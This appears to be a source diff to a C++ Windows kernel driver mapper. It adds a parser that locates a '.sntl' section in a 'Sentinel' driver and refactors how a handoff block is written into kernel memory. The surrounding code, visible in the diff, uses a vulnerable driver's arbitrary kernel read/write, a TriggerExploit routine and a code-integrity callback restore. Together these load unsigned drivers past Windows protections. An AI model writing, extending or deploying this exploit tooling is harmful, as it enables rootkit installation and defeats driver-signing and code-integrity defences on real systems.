@@ -399,6 +399,162 @@ static BOOL PreseedSentinelFileHandoff(PCWSTR sentinelPath, PVOID whoswhoBase, U
     return match;
 }
 
+struct sentinel_handoff_section_t
+{
+    ULONG rva;
+    ULONG size;
+    ULONG raw_offset;
+    ULONG raw_size;
+    ULONG image_size;
+};
+
+static BOOL QuerySentinelHandoffSection(PCWSTR sentinelPath, sentinel_handoff_section_t* outSection)
+{
+    const ULONGLONG start = GetTickCount64();
+    if (!outSection) {
+        LOG("QuerySentinelHandoffSection invalid output path=%ls elapsed_ms=%llu",
+            sentinelPath ? sentinelPath : L"(null)",
+            MapperElapsedMs(start));
+        return FALSE;
+    }
+    *outSection = {};
+
+    if (!sentinelPath || !sentinelPath[0]) {
+        LOG("QuerySentinelHandoffSection invalid path elapsed_ms=%llu",
+            MapperElapsedMs(start));
+        return FALSE;
+    }
+
+    HANDLE file = CreateFileW(
+        sentinelPath,
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr);
+    if (file == INVALID_HANDLE_VALUE) {
+        LOG("QuerySentinelHandoffSection open_failed path=%ls gle=%lu elapsed_ms=%llu",
+            sentinelPath,
+            GetLastError(),
+            MapperElapsedMs(start));
+        return FALSE;
+    }
+
+    auto fail_close = [&](const char* reason, DWORD detail) -> BOOL {
+        LOG("QuerySentinelHandoffSection failed reason=%s detail=0x%08lX path=%ls elapsed_ms=%llu",
+            reason ? reason : "unknown",
+            detail,
+            sentinelPath,
+            MapperElapsedMs(start));
+        CloseHandle(file);
+        return FALSE;
+    };
+
+    LARGE_INTEGER fileSize = {};
+    if (!GetFileSizeEx(file, &fileSize) ||
+        fileSize.QuadPart < static_cast<LONGLONG>(sizeof(IMAGE_DOS_HEADER))) {
+        return fail_close("size", GetLastError());
+    }
+
+    IMAGE_DOS_HEADER dos = {};
+    DWORD bytes = 0;
+    LARGE_INTEGER pos = {};
+    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
+        !ReadFile(file, &dos, sizeof(dos), &bytes, nullptr) ||
+        bytes != sizeof(dos) ||
+        dos.e_magic != IMAGE_DOS_SIGNATURE ||
+        dos.e_lfanew <= 0) {
+        return fail_close("dos_header", GetLastError());
+    }
+
+    if (static_cast<LONGLONG>(dos.e_lfanew) + static_cast<LONGLONG>(sizeof(IMAGE_NT_HEADERS64)) > fileSize.QuadPart) {
+        return fail_close("nt_header_bounds", static_cast<DWORD>(dos.e_lfanew));
+    }
+
+    IMAGE_NT_HEADERS64 nt = {};
+    pos.QuadPart = dos.e_lfanew;
+    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
+        !ReadFile(file, &nt, sizeof(nt), &bytes, nullptr) ||
+        bytes != sizeof(nt) ||
+        nt.Signature != IMAGE_NT_SIGNATURE ||
+        nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        return fail_close("nt_header", GetLastError());
+    }
+
+    if (nt.OptionalHeader.SizeOfImage == 0 || nt.OptionalHeader.SizeOfImage > 100 * 1024 * 1024) {
+        return fail_close("image_size", nt.OptionalHeader.SizeOfImage);
+    }
+
+    WORD sectionsCount = nt.FileHeader.NumberOfSections;
+    if (sectionsCount == 0 || sectionsCount > 64) {
+        return fail_close("section_count", sectionsCount);
+    }
+
+    ULONGLONG sectionTableOffset =
+        static_cast<ULONGLONG>(dos.e_lfanew) +
+        offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
+        nt.FileHeader.SizeOfOptionalHeader;
+    ULONGLONG sectionBytes = static_cast<ULONGLONG>(sectionsCount) * sizeof(IMAGE_SECTION_HEADER);
+    if (sectionTableOffset + sectionBytes > static_cast<ULONGLONG>(fileSize.QuadPart)) {
+        return fail_close("section_table_bounds", static_cast<DWORD>(sectionTableOffset));
+    }
+
+    IMAGE_SECTION_HEADER sections[64] = {};
+    pos.QuadPart = static_cast<LONGLONG>(sectionTableOffset);
+    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
+        !ReadFile(file, sections, static_cast<DWORD>(sectionBytes), &bytes, nullptr) ||
+        bytes != static_cast<DWORD>(sectionBytes)) {
+        return fail_close("section_table_read", GetLastError());
+    }
+
+    for (WORD i = 0; i < sectionsCount; ++i) {
+        char secName[9] = {};
+        memcpy(secName, sections[i].Name, 8);
+        LOG("QuerySentinelHandoffSection section[%u] name='%s' raw=0x%X raw_size=0x%X va=0x%X vsize=0x%X chars=0x%08X",
+            i,
+            secName,
+            sections[i].PointerToRawData,
+            sections[i].SizeOfRawData,
+            sections[i].VirtualAddress,
+            sections[i].Misc.VirtualSize,
+            sections[i].Characteristics);
+        if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) != 0) {
+            continue;
+        }
+
+        ULONG sntlSize = sections[i].Misc.VirtualSize;
+        if (sntlSize < sections[i].SizeOfRawData) {
+            sntlSize = sections[i].SizeOfRawData;
+        }
+        if (sntlSize < sizeof(aida_sentinel_handoff_block)) {
+            return fail_close("sntl_small", sntlSize);
+        }
+        if (sections[i].VirtualAddress > nt.OptionalHeader.SizeOfImage ||
+            sntlSize > nt.OptionalHeader.SizeOfImage - sections[i].VirtualAddress) {
+            return fail_close("sntl_image_bounds", sections[i].VirtualAddress);
+        }
+
+        outSection->rva = sections[i].VirtualAddress;
+        outSection->size = sntlSize;
+        outSection->raw_offset = sections[i].PointerToRawData;
+        outSection->raw_size = sections[i].SizeOfRawData;
+        outSection->image_size = nt.OptionalHeader.SizeOfImage;
+        LOG("QuerySentinelHandoffSection found path=%ls rva=0x%X size=0x%X raw=0x%X raw_size=0x%X image_size=0x%X elapsed_ms=%llu",
+            sentinelPath,
+            outSection->rva,
+            outSection->size,
+            outSection->raw_offset,
+            outSection->raw_size,
+            outSection->image_size,
+            MapperElapsedMs(start));
+        CloseHandle(file);
+        return TRUE;
+    }
+
+    return fail_close("sntl_missing", sectionsCount);
+}
+
 static void OpenMapperLog()
 {
     char logPath[MAX_PATH] = {};
@@ -737,6 +893,11 @@ namespace Utils {
 
 namespace MapperCore {
 
+    static BOOL WriteSentinelHandoffBlock(HANDLE device, PVOID sntlKernelAddr, ULONG sntlSize,
+                                          PVOID whoswhoBase, ULONG whoswhoSize);
+    static BOOL WriteSentinelGlobalsFromFile(HANDLE device, PCWSTR sentinelPath, PVOID sentinelBase,
+                                             ULONG sentinelImageSize, PVOID whoswhoBase, ULONG whoswhoSize);
+
     NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName,
                             PCWSTR shadowFsDriverFileName, PCWSTR targetDriverFullPath,
                             PCWSTR sentinelDriverFullPath, PCWSTR shadowFsDriverFullPath,
@@ -986,21 +1147,25 @@ namespace MapperCore {
                                     MapperElapsedMs(exploitStartTick));
                             }
                             PVOID sentinelBaseFast = nullptr;
+                            ULONG sentinelFastImageSize = 0;
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFileName && !deferSentinelLiveQueries) {
                                 const ULONGLONG sentinelFastStartTick = GetTickCount64();
                                 LOG("Post-load fast module query (Sentinel) begin status=0x%08X name=%ls elapsed_ms=%llu",
                                     static_cast<DWORD>(sentStatus),
                                     sentinelDriverFileName,
                                     MapperElapsedMs(exploitStartTick));
-                                sentinelBaseFast = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, nullptr);
-                                LOG("Post-load fast module query (Sentinel) exit status=0x%08X base=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+                                sentinelBaseFast = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentinelFastImageSize);
+                                LOG("Post-load fast module query (Sentinel) exit status=0x%08X base=%p size=0x%X elapsed_ms=%llu total_elapsed_ms=%llu",
                                     static_cast<DWORD>(sentStatus),
                                     sentinelBaseFast,
+                                    sentinelFastImageSize,
                                     MapperElapsedMs(sentinelFastStartTick),
                                     MapperElapsedMs(exploitStartTick));
                                 if (sentinelBaseFast) {
                                     cachedSentinelBase = sentinelBaseFast;
+                                    cachedSentinelImageSize = sentinelFastImageSize;
                                     g_SentinelLoadAddress = sentinelBaseFast;
+                                    g_SentinelImageSize = sentinelFastImageSize;
                                 }
                             }
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
@@ -1022,11 +1187,20 @@ namespace MapperCore {
                                     cachedTargetImageSize,
                                     MapperElapsedMs(preseedStartTick),
                                     MapperElapsedMs(exploitStartTick));
-                                sentinelGlobalsWritten = WriteSentinelGlobals(deviceHandle,
-                                    cachedSentinelBase,
-                                    cachedSentinelImageSize,
-                                    cachedTargetBase,
-                                    cachedTargetImageSize) ? true : false;
+                                if (sentinelDriverFullPath && sentinelDriverFullPath[0]) {
+                                    sentinelGlobalsWritten = WriteSentinelGlobalsFromFile(deviceHandle,
+                                        sentinelDriverFullPath,
+                                        cachedSentinelBase,
+                                        cachedSentinelImageSize,
+                                        cachedTargetBase,
+                                        cachedTargetImageSize) ? true : false;
+                                } else {
+                                    sentinelGlobalsWritten = WriteSentinelGlobals(deviceHandle,
+                                        cachedSentinelBase,
+                                        cachedSentinelImageSize,
+                                        cachedTargetBase,
+                                        cachedTargetImageSize) ? true : false;
+                                }
                                 LOG("WriteSentinelGlobals pre_ci_restore result=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                                     sentinelGlobalsWritten ? 1u : 0u,
                                     MapperElapsedMs(preseedStartTick),
@@ -1279,8 +1453,14 @@ namespace MapperCore {
                                 whoswhoImageSize);
                             status = STATUS_UNSUCCESSFUL;
                         } else {
-                            BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
-                                                     whoswhoBase, whoswhoImageSize);
+                            BOOL wsgResult = FALSE;
+                            if (sentinelDriverFullPath && sentinelDriverFullPath[0]) {
+                                wsgResult = WriteSentinelGlobalsFromFile(deviceHandle, sentinelDriverFullPath, sentBase, sentImageSize,
+                                                                         whoswhoBase, whoswhoImageSize);
+                            } else {
+                                wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
+                                                                 whoswhoBase, whoswhoImageSize);
+                            }
                             LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
                             if (!wsgResult) {
                                 LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
@@ -1702,6 +1882,107 @@ namespace MapperCore {
         return status;
     }
 
+    static BOOL WriteSentinelHandoffBlock(HANDLE device, PVOID sntlKernelAddr, ULONG sntlSize,
+                                          PVOID whoswhoBase, ULONG whoswhoSize) {
+        if (!sntlKernelAddr) {
+            LOG("ERROR: .sntl kernel address is null");
+            return FALSE;
+        }
+        if (!whoswhoBase) {
+            LOG("ERROR: WhosWho base is null");
+            return FALSE;
+        }
+        if (sntlSize < sizeof(aida_sentinel_handoff_block)) {
+            LOG("ERROR: .sntl section too small (0x%X < 0x%X)", sntlSize, static_cast<unsigned>(sizeof(aida_sentinel_handoff_block)));
+            return FALSE;
+        }
+        if (whoswhoSize == 0) {
+            LOG("ERROR: WhosWho size is zero");
+            return FALSE;
+        }
+
+        aida_sentinel_handoff_block handoff = {};
+        aida_sentinel_handoff_prepare(&handoff, whoswhoBase, nullptr, whoswhoSize);
+        const ULONGLONG handoffWriteStart = GetTickCount64();
+        NTSTATUS status = VulnDriver::WriteKernelMemory(device, sntlKernelAddr, &handoff, sizeof(handoff));
+        LOG_STATUS("WriteKernelMemory (.sntl handoff block)", status);
+        aida_sentinel_handoff_block verifyBlock = {};
+        NTSTATUS verifyStatus = VulnDriver::ReadKernelMemory(device, sntlKernelAddr, &verifyBlock, sizeof(verifyBlock));
+        LOG_STATUS("ReadKernelMemory (.sntl handoff verify)", verifyStatus);
+        PVOID verifyBase = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_base));
+        PVOID verifyObject = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_object));
+        BOOL validBlock = aida_sentinel_handoff_valid(&verifyBlock);
+        BOOL match = validBlock && verifyBase == whoswhoBase && verifyObject == nullptr && verifyBlock.target_size == whoswhoSize;
+        LOG("WriteSentinelGlobals handoff_verify write_status=0x%08X verify_status=0x%08X slot=%p magic=0x%08X version=%u block_size=0x%X checksum=0x%08X valid=%u base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
+            static_cast<DWORD>(status),
+            static_cast<DWORD>(verifyStatus),
+            sntlKernelAddr,
+            verifyBlock.magic,
+            verifyBlock.version,
+            verifyBlock.size,
+            verifyBlock.checksum,
+            validBlock ? 1u : 0u,
+            verifyBase,
+            whoswhoBase,
+            verifyObject,
+            verifyBlock.target_size,
+            whoswhoSize,
+            match ? 1u : 0u,
+            MapperElapsedMs(handoffWriteStart));
+        if (!NT_SUCCESS(status) || !NT_SUCCESS(verifyStatus) || !match) {
+            return FALSE;
+        }
+
+        LOG("WriteSentinelGlobals completed successfully");
+        return TRUE;
+    }
+
+    static BOOL WriteSentinelGlobalsFromFile(HANDLE device, PCWSTR sentinelPath, PVOID sentinelBase,
+                                             ULONG sentinelImageSize, PVOID whoswhoBase, ULONG whoswhoSize) {
+        LOG("=== WriteSentinelGlobalsFromFile ===");
+        LOG("sentinelPath=%ls sentinelBase=%p sentinelImageSize=0x%X whoswhoBase=%p whoswhoSize=0x%X",
+            sentinelPath ? sentinelPath : L"(null)",
+            sentinelBase,
+            sentinelImageSize,
+            whoswhoBase,
+            whoswhoSize);
+
+        sentinel_handoff_section_t section = {};
+        if (!QuerySentinelHandoffSection(sentinelPath, &section)) {
+            return FALSE;
+        }
+        if (!sentinelBase) {
+            LOG("ERROR: Sentinel base is null");
+            return FALSE;
+        }
+
+        ULONG effectiveSentinelImageSize = sentinelImageSize;
+        if (effectiveSentinelImageSize == 0) {
+            effectiveSentinelImageSize = section.image_size;
+        }
+        if (effectiveSentinelImageSize == 0 || effectiveSentinelImageSize > 100 * 1024 * 1024) {
+            LOG("ERROR: Invalid Sentinel image size supplied=0x%X file=0x%X", sentinelImageSize, section.image_size);
+            return FALSE;
+        }
+        if (section.rva > effectiveSentinelImageSize ||
+            section.size > effectiveSentinelImageSize - section.rva) {
+            LOG("ERROR: .sntl section outside Sentinel image rva=0x%X size=0x%X image_size=0x%X",
+                section.rva,
+                section.size,
+                effectiveSentinelImageSize);
+            return FALSE;
+        }
+
+        PVOID sntlKernelAddr = reinterpret_cast<PVOID>(
+            reinterpret_cast<ULONG_PTR>(sentinelBase) + section.rva);
+        LOG("WriteSentinelGlobalsFromFile resolved .sntl slot=%p rva=0x%X size=0x%X image_size=0x%X",
+            sntlKernelAddr,
+            section.rva,
+            section.size,
+            effectiveSentinelImageSize);
+        return WriteSentinelHandoffBlock(device, sntlKernelAddr, section.size, whoswhoBase, whoswhoSize);
+    }
+
     BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
                               PVOID whoswhoBase, ULONG whoswhoSize) {
         LOG("=== WriteSentinelGlobals ===");
@@ -1793,56 +2074,12 @@ namespace MapperCore {
             return FALSE;
         }
 
-        if (sntlSize < sizeof(aida_sentinel_handoff_block)) {
-            LOG("ERROR: .sntl section too small (0x%X < 0x%X)", sntlSize, static_cast<unsigned>(sizeof(aida_sentinel_handoff_block)));
-            return FALSE;
-        }
-
         if (sntlRva > effectiveSentinelImageSize || sntlSize > effectiveSentinelImageSize - sntlRva) {
             LOG("ERROR: .sntl section outside Sentinel image rva=0x%X size=0x%X image_size=0x%X", sntlRva, sntlSize, effectiveSentinelImageSize);
             return FALSE;
         }
 
-
-        if (whoswhoSize == 0) {
-            LOG("ERROR: WhosWho size is zero");
-            return FALSE;
-        }
-
-        aida_sentinel_handoff_block handoff = {};
-        aida_sentinel_handoff_prepare(&handoff, whoswhoBase, nullptr, whoswhoSize);
-        const ULONGLONG handoffWriteStart = GetTickCount64();
-        status = VulnDriver::WriteKernelMemory(device, sntlKernelAddr, &handoff, sizeof(handoff));
-        LOG_STATUS("WriteKernelMemory (.sntl handoff block)", status);
-        aida_sentinel_handoff_block verifyBlock = {};
-        NTSTATUS verifyStatus = VulnDriver::ReadKernelMemory(device, sntlKernelAddr, &verifyBlock, sizeof(verifyBlock));
-        LOG_STATUS("ReadKernelMemory (.sntl handoff verify)", verifyStatus);
-        PVOID verifyBase = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_base));
-        PVOID verifyObject = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_object));
-        BOOL validBlock = aida_sentinel_handoff_valid(&verifyBlock);
-        BOOL match = validBlock && verifyBase == whoswhoBase && verifyObject == nullptr && verifyBlock.target_size == whoswhoSize;
-        LOG("WriteSentinelGlobals handoff_verify write_status=0x%08X verify_status=0x%08X slot=%p magic=0x%08X version=%u block_size=0x%X checksum=0x%08X valid=%u base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
-            static_cast<DWORD>(status),
-            static_cast<DWORD>(verifyStatus),
-            sntlKernelAddr,
-            verifyBlock.magic,
-            verifyBlock.version,
-            verifyBlock.size,
-            verifyBlock.checksum,
-            validBlock ? 1u : 0u,
-            verifyBase,
-            whoswhoBase,
-            verifyObject,
-            verifyBlock.target_size,
-            whoswhoSize,
-            match ? 1u : 0u,
-            MapperElapsedMs(handoffWriteStart));
-        if (!NT_SUCCESS(status) || !NT_SUCCESS(verifyStatus) || !match) {
-            return FALSE;
-        }
-
-        LOG("WriteSentinelGlobals completed successfully");
-        return TRUE;
+        return WriteSentinelHandoffBlock(device, sntlKernelAddr, sntlSize, whoswhoBase, whoswhoSize);
     }
 
     NTSTATUS RestoreCiCallback(HANDLE device) {
